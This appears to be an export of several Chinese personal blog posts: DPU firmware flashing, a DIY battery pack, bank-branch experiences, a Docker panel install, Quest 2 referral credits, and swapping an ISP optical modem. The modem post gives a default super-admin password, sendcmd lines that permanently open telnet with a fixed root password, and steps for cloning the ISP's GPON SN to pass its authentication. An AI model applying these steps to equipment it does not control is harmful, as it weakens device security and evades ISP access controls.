MT_0000000809 PCI Device Name: /dev/mst/mt41686_pciconf0 Base GUID: b8cef60300f8d88a Base MAC: b8cef6f8d88a Versions: Current Available FW 24.31.0356 24.35.2000 NVMe N/A 20.4.0001 PXE 3.6.0401 3.6.0805 UEFI 14.24.0013 14.28.0016 UEFI Virtio blk 22.1.0011 22.4.0010 UEFI Virtio net 21.1.0011 21.4.0010 Status: Update required --------- Found 1 device(s) requiring firmware update... Perform FW update? [y/N]: y Device #1: Updating FW ... FSMST_INITIALIZE - OK Writing Boot image component - OK 从系统内提取固件（不需要操作）下面是提取这个固件的命令，我已经提取好了，不用再操作了 1scp ubuntu@192.168.100.2:/opt/mellanox/mlnx-fw-updater/firmware/mlxfwmanager_sriov_dis_aarch64_41686 / 提取出来的固件解包通过 mft-scripts 可以看到是有这个 PSID 的 181. MT_0000000809 MBF2M345A-VENOT_ES_Ax NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disa 然后从 mlnx-fw-updater_23.10-3.2.2.0_arm64.deb 中解包找到了最新的固件 24.39.3560 157. MT_0000000809 MBF2M345A-VENOT_ES_Ax NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disa 11、冷重启电脑，查看网卡版本查看到网卡版本已经更新到24.35.2000了 123456789101112131415161718192021root@recopec-MS-7D25:/home/recopec# mlxfwmanager Querying Mellanox devices firmware ... Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management PSID: MT_0000000809 PCI Device Name: 0000:06:00.0 Base GUID: b8cef60300f8d88a Base MAC: b8cef6f8d88a Versions: Current Available FW 24.35.2000 N/A PXE 3.6.0805 N/A UEFI 14.28.0016 N/A UEFI Virtio blk 22.4.0010 N/A UEFI Virtio net 21.4.0010 N/A Status: No matching image found 这个版本 UEFI BIOS 里面仍旧没有网卡模式选项，所以继续升级版本。 12、DPU 更新 DOCA 2.7 版本1bfb-install --rshim rshim0 --bfb bf-bundle-2.7.0-33_24.04_ubuntu-22.04_prod.bfb 更新过程中会提示更新 NIC FW 错误，不用管他 13、启动成功后修改默认账户和密码123456789101112131415161718Mellanox BlueField-2 A1 BL1 V1.1 NOTICE: No CDI passed to Riot core! NOTICE: BL2R: v2.2(release):4.7.0-25-g5569834 NOTICE: BL2R: Built : 22:05:22, Apr 26 2024 NOTICE: BL2R built for hw (ver 1) NOTICE: BL2R: Booting BL2 NOTICE: BL2: v2.2(release):4.7.0-25-g5569834 NOTICE: BL2: Built : 22:05:22, Apr 26 2024 NOTICE: BL2 built for hw (ver 1) NOTICE: Running as MBF2M345A-VENOT_ system NOTICE: No SPD detected on MSS0 DIMM0 NOTICE: No SPD detected on MSS0 DIMM1 NOTICE: Finished initializing DDR NOTICE: DDR POST passed. NOTICE: BL31: v2.2(release):4.7.0-25-g5569834 NOTICE: BL31: Built : 22:05:22, Apr 26 2024 NOTICE: BL31 built for hw (ver 1), lifecycle GA Non-Secured UEFI firmware (version BlueField:4.7.0-42-g13081ae-BId13127 built at 22:23:12 o) ubuntu ubuntu ubuntu Bf1122334455 13、更新网卡版本1234567891011121314151617181920212223sudo mst start sudo mst status sudo mlxfwmanager Querying Mellanox devices firmware ... Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-pt PSID: MT_0000000809 PCI Device Name: /dev/mst/mt41686_pciconf0 Base GUID: b8cef60300f8d88a Base MAC: b8cef6f8d88a Versions: Current Available FW 24.35.2000 N/A PXE 3.6.0805 N/A UEFI 14.28.0016 N/A UEFI Virtio blk 22.4.0010 N/A UEFI Virtio net 21.4.0010 N/A Status: No matching image found 传送网卡固件到 DPU 内 1scp mlxfwmanager_sriov_dis_aarch64_41686 ubuntu@192.168.100.2:/home/ubuntu/ 123456789101112131415161718192021222324sudo chmod +x mlxfwmanager_sriov_dis_aarch64_41686 sudo ./mlxfwmanager_sriov_dis_aarch64_41686 Querying Mellanox devices firmware ... Device #1: ---------- Device Type: BlueField2 Part Number: MBF2M345A-VENOT_ES_Ax Description: NVIDIA BlueField-2 E-Series Eng. sample DPU; 200GbE single-port QSFP56; PCIe Gen4 x16; Secure Boot Disabled; Crypto Enabled; 16GB on-board DDR; 1GbE OOB management PSID: MT_0000000809 PCI Device Name: /dev/mst/mt41686_pciconf0 Base GUID: b8cef60300f8d88a Base MAC: b8cef6f8d88a Versions: Current Available FW 24.35.2000 24.39.3560 NVMe N/A 20.4.0001 PXE 3.6.0805 3.7.0300 UEFI 14.28.0016 14.32.0017 UEFI Virtio blk 22.4.0010 22.4.0012 UEFI Virtio net 21.4.0010 21.4.0013 Status: Update required 冷重启之后查看到更新完成 14、切换为 NIC 模式https://docs.nvidia.com/doca/sdk/nvidia+bluefield+modes+of+operation/index.html#src-2609505413_id-.NVIDIABlueFieldModesofOperationv2.7.0-NICModeforBlueField-2 非常简单，官方提供了几种模式，其中最方便的是在 ARM 的 UEFI BIOS 里面修改。 Select “Device Manager”. Select “System Configuration”. Select “BlueField Modes”. Set the “NIC Mode” field to NicMode to enable NIC mode. 上面的貌似不起作用，用下面这个试试。 12// 启用 NIC 模式 mlxconfig -d mt41686_pciconf0 set INTERNAL_CPU_PAGE_SUPPLIER=1 INTERNAL_CPU_ESWITCH_MANAGER=1 INTERNAL_CPU_IB_VPORT0=1 INTERNAL_CPU_OFFLOAD_ENGINE=1 重启之后，网卡显示未插入网线，应该是正常了？我没有条件测试，就这样了，给物主发回去了。 所有的资源都在这里，网盘链接失效了的话就从我NAS里面慢慢拖吧，另外官网里面都有下载地址，随便找找就有了。 链接：https://pan.baidu.com/s/1UV7XDu6N3P9oROhStSS8hw?pwd=2333提取码：2333 https://alist.irec.moe/@login 用户名：bf 密码：bf12345","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"网卡","slug":"网卡","permalink":"https://blog.irec.moe/tags/%E7%BD%91%E5%8D%A1/"}]},{"title":"炸飞老铁之自组电池组","slug":"硬件/20240605_炸飞老铁之自组电池组/炸飞老铁之自组电池组","date":"2024-06-05T04:00:00.000Z","updated":"2024-06-05T02:16:40.000Z","comments":true,"path":"/zhafeilaotie.html","permalink":"https://blog.irec.moe/zhafeilaotie.html","excerpt":"","text":"前情提要近期由于入了短波无线垫（电）坑，迫切需要一块电池供野外架台使用，所以萌生了组一块电池组的想法。刚好自己有一些曾经从PDD薅羊毛来的电芯，遂，开干！ 前期准备查阅了一些资料，刚开始认为电池12.6V给电台用够了，另外给我自己的12V用电设备也OK，所以初步拟定电池是3S2P。然后想着8Ah容量会不会太小了，准备再并一组，在淘宝上买了一些疑似假的40LA，内阻比普通的40LA高，普遍都在9mΩ左右，不过好在还能用，容量也差不多。 BOM表 名称 价格 数量 实付款 购买渠道 21700 LS40LA K标 5 6 30 拼多多 砸金蛋，现无活动 21700 LS40LA 假标 5 3 15 淘宝 诺祥锂电池 21700 支架款镍片 4.5 1 2.5 天猫 21700 青稞纸 60张 2.8 1 0.8 天猫 启色数码旗舰店 21700 三联支架 6个 2.2 1 0.2 天猫 汉亨旗舰店 4P排线 XH2.54 1.7 2 1.4 淘宝 新容芯科技企业店 三线电压表 0.28寸 2.8 1 0.8 淘宝 船型开关 0 0 0 坏的热熔胶枪上拆的 外壳 AG 110 * 80 * 85 4.6 1 2.71 淘宝 软硅胶线 12AWG 4.3 2 5.4 淘宝 XT60E-F 带黑色防尘盖 3 1 0.91 淘宝 M2.5&#x2F;2.0 螺丝螺母诺干 0 0 0 现有的 通过88VIP+签到红包配合下来买这些零碎的东西还是很便宜的。 收货中测试新电池东西陆陆续续到货中，最开始到的是这个假标的40LA，外皮皱皱巴巴，尺寸也比K标的40LA大一圈，重量也不对。扫码二维码是不对的，观察外皮上的二维码图案也看的出来是一样的。怀疑是其他的型号套皮，不过测出来的内阻和容量都在可接受范围内，问商家商家装傻，就不和他纠缠了，直接如实评价送上。 制作过程装盒预组支架和青稞纸到了，把电池拿来做一下预组，称一下重量和量一下尺寸，塞进盒子里面。 发现塞不进盒子的顶盖，后面才发现顶盖是有凸起的结构的，具体尺寸还是要比标称的内盒尺寸小一圈，卖家完全没有说这个尺寸会偏小的问题，我这个AG 110*80*85型号的实测尺寸如下。 上盖：69.2mm*70.1mm 内盒：73.3mm*73.7mm 电池组之前量的尺寸是70.6mm，刚好塞不进去上盖，把凸起的榫头给他切了，刚好放进去。 最后的电池尺寸是68.8mm*69.3mm。 盒子开孔因为电池组不带保护板，为了监控电池电压，准备加一个开关和一个电压表，初步定的位置是在上盖。XT60接口的话，就开在盒子内正面。 想法有了，立马开干，可结果不尽人意。 计划是用宝塔钻开孔，然后慢慢扩，可是掌握不了力度，最后开的稀烂，如图。 和狗啃一样，但是还能用（xD。发群里请教经验，结果被狠狠嘲笑了。 然后 BG7EHL 大佬出来传授经验，如下 第一步 这个方孔要先划线，用刀片就行。划完脏手一摸就有印了，手太干净可以先到锅底摸一把。第二步 四个角打孔。3.2-4.0就行。俗称小钻花。打到线里面不要过线。第三步 烧报废的钢锯条。或者刀片都行，烧红了就沿着线里面一按就切穿了。4个边一切这个孔就出来了。第四步 用锉刀修，用刀子削。 事已至此，已经没有补救机会了，下次再用这个办法，准备新购一把锉刀。 点焊电池苦于没有点焊机，手头上的电池都没法发挥作用，上次组手电钻电池还是让商家点焊好发过来我这边再焊接的。最近一直在寻觅点焊机，找了一圈发现只有两种点焊机能买，电容式点焊机和变压器点焊机。 其中的门道还有很多很多，但是软包锂电的点焊机据说不能买，多点焊几次电池就不行了，事实是怎么样我也不清楚。刚开始是准备买一个电容式点焊机的，但是市面上的方案很多很多，另外看起来这个路线还没卷到头，所以就一直在观望，现在看到的比较合适的就是小强电子的电容式点焊机，他做了很多种方案，性能很好，但是价格不友好。一套能用的价格得300+了，我的预算是100左右搞一套能点0.2镀镍钢带的就够了。闲鱼上也看了看，参差不齐，有些成品电容到控制板的线还很长，另外一些成品没有外壳，很丑，我还是想搞一套比较精致的。 变压器点焊机则受限于控制板和变压器了，具体我没看，因为太重被我直接 Pass 了。 最后是求助于本地 HAM，刚开始准备去 BG7EHL 麻烦他帮点焊一下，然后 BD7BS 说他最近比较忙，直接用 BD7BS 的点焊机点好了，效果还出奇的好，他用的是变压器点焊机，焊点都不发黑，看着真舒服。 在点焊电池之后，让BD7BS帮忙给盒子重新开了一下孔，同时也观摩了一下开孔过程。效果还是比我的好很多，但是细节不够完美。 测试容量顺带测了一下容量，12.43V放电到9V，放出来10Ah，可以！ 组装电池组组装上盖船型开关直接插进去即可，电压表则我是用 M2.5 10mm 的沉头螺丝加一个 3.7mm 厚的螺母，这些材料其实都是利旧。有现成的就没有刻意去买了。 建议的参数是用 M2 * 10mm 的螺丝 加一个 4mm 厚的螺母，在电压表对应螺丝孔位置用 1.8 的麻花钻开一个孔，不要开透了，然后用螺丝直接攻丝进去，这样固定住了也很美观。也可以不用螺丝固定，直接热熔胶固定。 这里要注意的就是船型开关和电压表垂直距离要离开大一点，实际距离可以自己比划一下。 最后在表面帖一层透明胶或者保护膜都行，盖住电压表就行，注意电压表表面上是有一层膜的，记得撕掉。 焊接采集排线首先在支架上标记好焊接点，比如-，B1，B2，+，然后给镍片上预先上一点锡。完成之后，先焊接最远的一根线，然后固定好位置，其他的线超过焊接点的长度剪掉，这样搞出来的采集排线挺规整的，最后效果如下所示。 如果需要电压表的话，从电池的总负记得预留一根线上来，我用的是30AWG的硅胶线，就算碰到短路了也应该能很快烧断吧？ 焊接XT60然后就是焊接XT60接头和线，建议正负极都横着出线。我正极预留的线是10cm，负极20cm（15cm比较合适）。盒子空间比较紧凑，硅胶线在浸润锡之后有一截会变硬，导致弯折不了（是真的一点都弯折不了），最后我把正极的拆了重新弯着焊接了一下。最后热缩管是肯定要安排上的，碰到了电池外皮破皮了之后就直接炸飞老铁了（不是说着玩的！），负极的线也要上热缩管，碰到了也相当于后面两串短路了，很危险！ 焊接好XT60之后就可以装壳了，把XT60塞进去，上好螺丝，上好螺丝，上好螺丝，重要的事情说三遍，别问我为什么说三遍。 焊接电池接下来是焊接电池的总正和总负，考虑到过流能力就没焊在镍片的末尾，在镍片中间焊接的。这一步烙铁温度要开高点，建议给硅胶线先上好锡，然后再焊接到镍片上。原因是硅胶线相较于镍片线的热容积比较大，毕竟是12AWG的线，要加热好一会。我用的烙铁头是K头，Ku头不行，导热面积不够。先焊接负极，装壳进去，然后再焊接正极。其最终效果如图 焊接电压表这里就不多做叙述了，看图就行，建议先焊接表正极的检测点到开关，再焊接电池的总正到开关，防止短路。最终效果如下图所示。 三线表的话，直接电源和采集电压正极焊在一起就行，当两线用 收尾工作开洞填补之前不是有开了很丑的洞嘛，我是首先在洞的另一面贴上透明胶，然后打上热熔胶等待他自然流平然后凝固，最后撕掉热熔胶，就得到平整的表面了。 其实为了追求好看的话，比如说增加一个透明窗，可以用UV胶之类的高透胶，同时硬度也会好很多，我这边就是最低成本凑合用的做法，仅供参考。 测试电压表打开电压表，It works！ 插入SW3518模块，检测协议正常，给设备充电也正常，由于是纯降压模块，没有20V档位正常。 不均衡充电测试不均衡冲到满电12.6V，各串压差小于10mv，满意了。 后续通过观察三元锂电池SOC曲线可以得知。在3S情况下，三元锂电池还有90%电量时，单串电压有3.95V，体现到电池组上只有11.85V了。而在50%电量时单串还有3.6V左右，整串就只有10.8V了。考虑到放电时还有压降，实际使用中可能直接掉到10V以下了。 而磷酸铁锂就没这个问题，放电曲线很平缓，如下图所示。 4S情况下，SOC 90%情况下，总电压13.12，SOC 10% 下 12.6V，可见磷酸铁锂的放电特性非常适合电台使用。 还是 BD7BS 有先见之明。 改进在我实际场合中，用的设备是 IC-7300。 他的表显是 10V - 16V，查阅规格书得知推荐电压范围是 13.8 volts DC (+&#x2F;- 15%) at 21 amps 通过计算得知推荐最低电压是 11.73V，在用三元锂的情况下，可能实际效果不尽人意。所以计划改到4串。 在4串情况下，整个电池组不能充满，充满电压是 16.8V，超过IC-7300的 16V 上限了，我计划是充到 16V，也就是单串 4V，正好对应上面三元锂电池的 SOC 90%+ 状况下，同时在 10% SOC 下，也有 13.4V 的总电压，不用担心大电流掉压导致GG的问题了。 所以准备改成4串3并，然后简单计算了一下尺寸。 4串电池 68.8mm * 91.7mm 130 * 80 * 85mm 盒子 内盒标称：71.2mm * 92.9mm 内盒预估：73.3mm * 93.8mm 上盖预估：69.2mm * 90.2mm 电池组应该装得下，但是支架可能要切一下，应该是没有问题的。 直接下单新的电池和盒子还有电池支架，等待到货。","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"电池","slug":"电池","permalink":"https://blog.irec.moe/tags/%E7%94%B5%E6%B1%A0/"},{"name":"无线电","slug":"无线电","permalink":"https://blog.irec.moe/tags/%E6%97%A0%E7%BA%BF%E7%94%B5/"}]},{"title":"2024年银行网点体验记录","slug":"生活/20240222_银行卡开卡记录/2024年银行卡开卡记录","date":"2024-02-22T04:00:00.000Z","updated":"2024-02-22T13:23:28.000Z","comments":true,"path":"/2024_bank_log.html","permalink":"https://blog.irec.moe/2024_bank_log.html","excerpt":"","text":"工商银行郴州永兴支行营业室网点评价：优 经过首次前往日期：2月1日 开卡日期：2月1日 起初想问网点有没有龙年纪念卡现货，被告知没有后在网上申请后到网点激活，服务很周到，接待员还教了如何利用预约来插队。 我有一个4年前的二类户，经历3天碰到各种问题顺利销户，网点耐心解决。 我方在2月21日再去网点，因为参加“湘约惠月月刷”活动，20W限额不够用，申请改月限额。 首先柜员帮操作后碰到“工银e支付”无法开通问题，中途周转 柜员 -&gt; 大堂经理 -&gt; 年轻服务人员 -&gt; 柜员 -&gt; 主管，最后碰到 bug 无法解决，告知次日再来，此事还在解决当中。总体服务超级好，不厌其烦为客户解决问题，最后没完成还向客户致歉，我方也向对方致歉表示耽误时间了。 后续回访暂无 邮储银行永兴县干劲路支行网点评价：优 经过首次前往日期：2月2日 开卡日期：2月2日 打电话询问是否有美团联名卡库存后，遂到网点后开卡，断卡先锋我是中风险（黄马）客户（近期有新开广电卡），告知是因为广电卡改套餐引起的，询问主要用途后顺利开卡。网点服务热情友好，保安大哥特别热情。 后续回访2月20日07355523377回电询问卡是否是本人使用，态度良好，得到结果后挂机。 湖南农信永兴县干劲路支行网点评价：良 经过首次前往日期：2月6日 开卡日期：2月8日 由于是家人常去的行，陪同家人存定期后顺路询问网点人员，是否能开卡，得到否定答复。后建议我方开信用卡，得知学生能开信用卡后扫码网申，于2月22日申请通过。 次日再去和网点人员询问后说可以试试，在前台填好申请表后，在柜台开卡时遭到柜员拒绝，柜员询问我参加何种活动需要开卡，我如实告知，柜员说我们没有这种活动，我方告知柜员关注”湖南农信”微信公众号，上面有活动内容，后柜员岔开话题告知银行内有规定不给开卡，我方需询问是何种文件，柜员无法告知，后续多次柜员以各种理由推辞开卡事宜，我受不住遂离开网点。 当天下午拨打湖南农信客服热线，客服告知是以261号文件，我方仔细阅读文件后发现未有相关规定，随后再次拨打客服热线客服答应反应此问题。后日网点人员回电告知可以来开卡，次次日来到网点顺利开卡，柜员表示”我们不是不给你开卡“，我方如实告知昨日经过，柜员笑着结束话题。总体服务中规中矩，服务人员年轻，但是主管和柜员年龄偏老，思想落后不愿意接受新事物，只能给到这个评价了。 后续回访2月22日07355525888回电询问用卡相关事宜，告知我方上了反诈名单，可能会调整卡限额之类的，问我用卡主要用途，我方如实告知。后对方询问参加何种活动，我说微信公众号上有，对方再次询问细节，我方如实告知。对方说你弄这些干什么，我方告知不止这一家银行有活动，我参加的都是正规活动，你要查流水发现我有异常就随便了，后对方察觉到我对此表示反感后，挂断电话。 建设银行永兴大桥路支行网点评价：优 经过首次前往日期：2月20日 开卡日期：2月20日 年前询问我们这最大的建行网点”龙年贺岁龙卡“是否有库存，得到管理这个卡的人员放假了。在2月20日再次致电询问，告知否定答复后顺路去湖南银行开卡，告知断卡先锋为高风险客户不给开卡。 随后回家路上看到路边的支行网点，遂前往询问是否有库存。网点人员说不确定，帮我打电话询问了一下，得出肯定答复。我方询问高风险客户是否能开卡，网点人员回复说可以试试，遂填表后到柜台申请。查看断卡先锋我是中风险（黄马）客户，柜员没有多问，告知卡必须是本人使用，提额要在半个月后申请。柜员表示你是我们第一个申请”龙年贺岁龙卡“卡的客户。 后网点工作人员帮忙操作激活卡，领立减金等事宜，最后加了客户经理微信。 总体服务超赞，耐心体贴，为客户着想。 后续回访暂无 湖南银行永兴分行网点评价：差 经过首次前往日期：2月20日 开卡日期：2月20日 2月20日到网点询问我想参加活动，是否能开卡，网点人员询问用途后我方如实告知，后填表去 VTM 开卡，告知断卡先锋为高风险客户不给开卡，后我方解释用途后，可以开卡，但是不给开通在线支付，我方表示会打客服热线反应此问题。 后在网点门口打电话询问此事宜，客服人员首先是常规话术，浪费了5分钟左右。后我方主动提出提交工单处理才询问具体事宜。次日支行回电告知可以开卡，二类卡限额1000。后来到网点顺利开卡，正常服务，没有多问。 给差的理由是不为客户着想，优先考虑高价值用户，不考虑客户实际需求，随意给出否定断言，欺骗客户。 后续回访暂无 长沙银行永兴分行网点评价： 经过首次前往日期：2月21日 开卡日期： 2月21日到网点询问我想参加活动，是否能开卡，得到试一试的回答。网点人员拍照了我的学生证，学信网，云闪付卡列表，网点人员是年轻妹子，挺好说话的，她询问网点主管能不能开卡，得到否定回复，我方和网点人员交涉之后再次询问主管，依然否定回复，并未告知具体原因，遂离开网点。 离开网点后致电长沙银行客服热线，接线员是长沙妹子，声音很好听，主动询问我的诉求之后帮我仔细记录反馈，后互相问好后挂断，服务特别周到，为客户着想，非常好评。2月22日网点回电，询问卡用途，后告知无法开通在线支付，打太极几轮后最后答应给我开卡，可能限额1、200，后续有需要再提额。由于不在本地无法开卡，次日再去。 后续回访暂无 浦发银行郴州支行网点评价：优 经过2月22日陪同父亲到网点销卡，顺路询问我想参加活动，是否能开卡，得到需要给出辅助证明材料，由于我不在市区上学，户口也不在市区本地，网点人员建议我去学校当地网点开卡，后遂离去。由于办了业务给了2小时免费停车券。 总体服务好评，核心是为客户着想。 后续回访暂无","categories":[{"name":"生活","slug":"生活","permalink":"https://blog.irec.moe/categories/%E7%94%9F%E6%B4%BB/"}],"tags":[{"name":"银行卡","slug":"银行卡","permalink":"https://blog.irec.moe/tags/%E9%93%B6%E8%A1%8C%E5%8D%A1/"},{"name":"羊毛","slug":"羊毛","permalink":"https://blog.irec.moe/tags/%E7%BE%8A%E6%AF%9B/"}]},{"title":"湖南联通固网折腾记录","slug":"硬件/20240130_湖南联通更换光猫记录/20240130_湖南联通更换光猫记录","date":"2024-01-30T04:00:00.000Z","updated":"2024-02-22T14:42:56.000Z","comments":true,"path":"/hn_unicom.html","permalink":"https://blog.irec.moe/hn_unicom.html","excerpt":"","text":"省流地区：湖南省郴州市永兴县 验证方式：验证 LOID（宽带账号） + PASSWORD（123456）+ GPON SN（不正确 BRAS 提示 AAA authenticate terminal failed） BRAS：HNCZ-YX-M6000_18S-B1 IPTV VLAN 30 INTERNET 无 VLAN TR069 VLAN 8 经过由于近期广电总局对于 OTT 限制，家人抱怨电视看不了。我于2023年11月30日看到手厅有 + 30元500M宽带 + IPTV 活动，于是在线申请，随后有一位李师傅联系我。我方询问对方户主本人不在现场是否能报装，对方帮我询问后给出我否定回复。 在我回家后2023年12月26日主动联系李师傅可以报装宽带了，次日就上门给我下安装单。他也是加友，8T用了好几年了，准备换魅族手机，白色确实好看，俩人聊天挺合得来的。 最后给我开了1000M 宽带（因为在他系统里500M 和1000M 是一样的价格）。 当天师傅就上门带着 ZTE F657GV9(V9.2.0P1T2) 和创维 E900V21A 上门安装。 光猫不带 WiFi 功能，机顶盒是S905+2+8 也不带 WiFi，问师傅没有线路怎么办，师傅有点头疼的样子。还好家里有网线，自己从踢脚线到天花板布好线了，借用了一下师傅网线钳，他在扯光纤，我在家里布线，最后忙到1点多才整好。师傅用的国产熔纤机，光纤套了管，没有用保护套，是直接剥皮线的钢丝，然后热缩管绑在上面让钢丝受力，其实也能用，就是有点丑。 机顶盒开机还不支持全屏进电视，进入老年人模式也只能做到小窗看电视，还是需要二次操作才能进入电视界面。 查看系统版本还是2022年的版本，希望能尽快落实广电总局下的《有线电视业务技术要求》和《IPTV业务技术要求》。用着暂时还能接受，父母对于操作也熟悉了，就不去投诉了。 有线电视和IPTV终端均应提供**“开机进入全屏直播”和“开机进入突出直播频道的交互主页”**两种“开机模式”选项。系统默认设置应为“开机进入全屏直播”。有线电视和IPTV终端开机过程所需时间应不大于35秒，不应因播放开机广告等特定内容延长开机时间。 折腾原因光猫默认配置是 NAT3，当然宽带 v4 公网是不用想的，IPv6 公网是封了 80 443 入站的，加上这有1000 M 啊，比移动的300 M 不知道快到哪里去了，我肯定得替换成主用网的。 师傅告知需要入网一个月才能更换光猫，不然会影响他的业绩，所以我在2024年1月30日的清晨开搞（不要问为啥，因为失眠了没事干啊啊啊啊啊啊） 获取参数首先的是要拿到光猫相关参数，已经问过师傅拿不到超密，只能自己动手了。 首先是拔光纤重置光猫，用默认超密 CUAdmin#HGU 进去瞅了一眼。 并没有 IPTV 相关的组播配置，以为是没有下发配置导致的，所以准备固化 Telnet 后导出配置看看。 开 Telnet使用 mayi5147 的 FactoryMode 工具得到临时 Telnet 账号密码 然后常规固化 Telnet 12345678910111213sendcmd 1 DB p TelnetCfg sendcmd 1 DB set TelnetCfg 0 Lan_Enable 1 sendcmd 1 DB set TelnetCfg 0 TS_UName root sendcmd 1 DB set TelnetCfg 0 TS_UPwd Zte521 sendcmd 1 DB set TelnetCfg 0 TSLan_UName root sendcmd 1 DB set TelnetCfg 0 TSLan_UPwd Zte521 sendcmd 1 DB set TelnetCfg 0 Max_Con_Num 99 sendcmd 1 DB set TelnetCfg 0 ExitTime 999999 sendcmd 1 DB set TelnetCfg 0 InitSecLvl 3 sendcmd 1 DB set TelnetCfg 0 CloseServerTime 9999999 sendcmd 1 DB set TelnetCfg 0 Lan_EnableAfterOlt 1 sendcmd 1 DB save reboot 下发配置 正常走完下发，超密没被改，不过上网参数没有账号，手动填入账号后正常拨号上网。 IPTV 依旧没有组播信息，IPTV 正常观看，遂直接开搞。 更换光猫换的光猫型号依旧是老朋友华为 HS8145X6，直接进去修改 LOID 和 PASSWORD 顺利走到 O5 不过拨号拨不上，IPTV 也看不了，随后发现是网口绑定错误了，绑定的4口结果 IPTV 插在1口，放的方向导致顺序颠倒插错了，排查掉这个问题依然不能看，我就有点急了，直接用电脑抓 PPPoE 包，提示 AAA authenticate terminal failed。 后面改网口 MAC 为光猫的，没用。 最后拨号过多直接被 Radius 冻结账号了。 最后多次更换排查，发现是还有一个 GPON SN 认证要素，改成原来中兴光猫的就一切正常了，虚惊一场。 更换成华为光猫之后，NAT1。 IPTV 也正常观看。 End！ 希望本文能作为参考帮助阅读到这里的各位。","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"光猫","slug":"光猫","permalink":"https://blog.irec.moe/tags/%E5%85%89%E7%8C%AB/"}]},{"title":"在群晖的 Docker 上安装 1Panel 面板","slug":"硬件/20240109_群晖1Panel安装/20240109_群晖1Panel安装","date":"2024-01-09T12:00:00.000Z","updated":"2024-01-16T10:25:01.000Z","comments":true,"path":"/install_1panel_with_synology_docker.html","permalink":"https://blog.irec.moe/install_1panel_with_synology_docker.html","excerpt":"","text":"起初是家里 NAS 上 docker 跑的宝塔面板经常出问题，掉电重启之后 mysql 经常会异常停止，然后去面板上经常需要重新绑定账号，所以有迁移到 1Panel 的想法。 首先使用 moelin&#x2F;1panel 镜像，需要使用 SSH 进入NAS 后，使用 sudo -i 后用 root 权限执行安装命令 12345678910docker run -d \\ --name 1panel \\ --restart always \\ --network host \\ -v /var/run/docker.sock:/var/run/docker.sock \\ -v /volume2/docker/1panel/volumes:/var/lib/docker/volumes \\ -v /volume2/docker/1panel/opt:/opt \\ -v /volume2/docker/1panel/root:/root \\ -e TZ=Asia/Shanghai \\ moelin/1panel:latest 正常进入系统后安装 openresty 和 mysql，查看到报错文件映射有问题。 因为文档教程的宿主机和容器内外映射路径是一样的，所以问题出在这里。 这里就拿 mysql举例，手动修改 compose 配置文件文件映射部分，我的实际目录是在 /docker/1panel/opt/1panel/apps/mysql/mysql 下（注意这里有两个 mysql） 12345678910111213# 原始配置文件 - ./data/:/var/lib/mysql - ./conf/my.cnf:/etc/my.cnf - ./log:/var/log/mysql - /etc/timezone:/etc/timezone:ro - /etc/localtime:/etc/localtime:ro # 下面是我的配置文件 - /volume2/docker/1panel/opt/1panel/apps/mysql/mysql/data/:/var/lib/mysql - /volume2/docker/1panel/opt/1panel/apps/mysql/mysql/conf/my.cnf:/etc/my.cnf - /volume2/docker/1panel/opt/1panel/apps/mysql/mysql/log:/var/log/mysql - /etc/timezone:/etc/timezone:ro - /etc/localtime:/etc/localtime:ro 同时在宿主机目录下面创建好没有创建的目录或者文件，空的就行，比如我这里就少了一个 data 文件夹和 log 文件，操作好后手动点击一下重建按钮。如果还是报错查看一下错误信息，如果是缺少文件之类的报错，操作之后直接点重启即可。 如果提示 &#x2F;etc&#x2F;timezone can’t find 什么的，同样用 ssh 执行一下下面的命令即可。 12touch /etc/timezone echo &#39;Asia/Shanghai&#39; &gt; /etc/timezone 最后还是不用套娃了，在 VMM 里装了个 Rocky Linux 再装了个 1Panel，省心好多。希望此经验能帮助到大家。","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"群晖","slug":"群晖","permalink":"https://blog.irec.moe/tags/%E7%BE%A4%E6%99%96/"}]},{"title":"Quest 2 新设备领取30刀商店点数 & 折腾记录","slug":"硬件/20230916_Oculus Quest 2 折腾记录/Oculus Quest 2 折腾记录","date":"2023-09-16T12:00:00.000Z","updated":"2023-11-22T07:43:27.000Z","comments":true,"path":"/quest2.html","permalink":"https://blog.irec.moe/quest2.html","excerpt":"","text":"Quest 2 新设备领取30刀商店点数 &amp; 折腾记录官方的活动页面：https://www.meta.com/quest/referrals/ 先决条件1、你的设备是没被人领取过的。 2、账户创立时所用的 IP 是和邀请码同样地区的。 3、这个账户没有激活过 Quest 设备，不然点别人的推荐链接都接受不了。 4、不管你设备用了多久，只要没被人领过就能薅到这30刀。 正文起初是我想买个正版的 BS，看到有人推荐去买兑换码，然后去臭鱼搜了搜，发现别人是用送的礼金买的兑换码，再转手卖。于是我也想折腾一下礼金。我机器是买的二手，想看看前任机主有没有薅过，如果没薅过的话就把 VD 给入正了。折腾的过程中问题不断，网上的信息也是少的可怜，根据我的检索能力是找不到什么有用的信息的了。 臭鱼上有代激活的，我想着应该不难，最后摸索了一下总结出了经验。 具体步骤如下1、确定新的账户能正常接受推荐链接，也就是 ACCEPT REFERRAL 能点进去不报错。 2、头显激活过 -&gt; 恢复出厂，没有激活过直接跳过这步。 3、手机登录 Meta Quest APP，然后和头显正常配对。 4、一般配对成功后会收到一条通知，可以去 设置 -&gt; 支付方式，查看是否有礼金。 注意：注册成功后就不要切换节点了，我已经死了一个号了。暂时不知道是 APP 内通过联网检测到了还是头显检测到了，我这边是网关代理模式，用了一会这个小蓝条就消失了。 